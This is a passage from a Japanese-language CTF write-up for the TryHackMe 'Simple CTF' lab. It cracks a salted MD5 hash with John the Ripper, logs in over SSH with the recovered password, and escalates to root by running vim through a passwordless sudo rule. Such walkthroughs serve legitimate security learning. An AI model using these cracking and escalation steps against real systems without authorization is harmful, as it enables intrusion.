+<pre><code>echo &quot;0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2&quot; &gt; hash.txt
+</code></pre>
+<p>それを使ってhashcatする</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+No devices found/left.
+
+Started: Thu May 14 09:23:51 2026
+Stopped: Thu May 14 09:23:52 2026
+</code></pre>
+<p>vm環境ではGPUが使えないのでエラーを吐く<br>
+john the ripperを使うことにする</p>
+<p><code>ユーザー：ハッシュ$ソルト</code>の形でjohn用のテキストファイルを作る</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ echo &quot;mitch:0c01f4468bd75d7a84c7eb73846e8d96\$1dac0d92e9fa6bb2&quot; &gt; john_hash.txt
+</code></pre>
+<p>実行する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ john --format=dynamic_4 --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+secret           (mitch)     
+1g 0:00:00:00 DONE (2026-05-14 09:28) 33.33g/s 224000p/s 224000c/s 224000C/s 123456..BITCH
+Use the &quot;--show --format=dynamic_4&quot; options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p><code>secret</code>が出た<br>
+<code>dynamic_4</code> と明示することで、John the Ripper に対して「このハッシュは『パスワード＋ソルト』をMD5したものだから、そのルールで総当たりしてくれ」と指示していることになる。</p>
+<p>これを使ってsshログインを試みる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+└─$ ssh mitch@10.49.142.133 -p 2222 
+The authenticity of host '[10.49.142.133]:2222 ([10.49.142.133]:2222)' can't be established.
+ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.49.142.133]:2222' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+mitch@10.49.142.133's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ whoami
+mitch
+$ 
+</code></pre>
+<p>入れた。パスワードはsecret。</p>
+<p>つぎの権限昇格を狙う<br>
+権限昇格はいくつかの定石があった<br>
+まず<code>sudo -l</code>を実施する</p>
+<pre><code class="language-bash">$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ 
+</code></pre>
+<p>passいらずでvimをsudo実行できることがわかった<br>
+GTOBinsで調べる<br>
+調べたところvimではなくviのところにそれらしきコマンドがあった</p>
+<pre><code class="language-bash">$ vi -c ':!/bin/sh' /dev/null
+
+$ whoami 
+mitch
+$ sudo vim -c ':!/bin/sh' /dev/null
+
+# whoami 
+root
+# 
+</code></pre>
+<p>rootが取れた</p>
+<pre><code class="language-bash"># find / -name root.txt 2&gt;/dev/null
+/root/root.txt
+# cat /root/root.txt
+W3ll d0n3. You made it!
+# 
+</code></pre>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/simplectf">https://tryhackme.com/room/simplectf</a></p>
+  </footer>
+</body>
+</html>
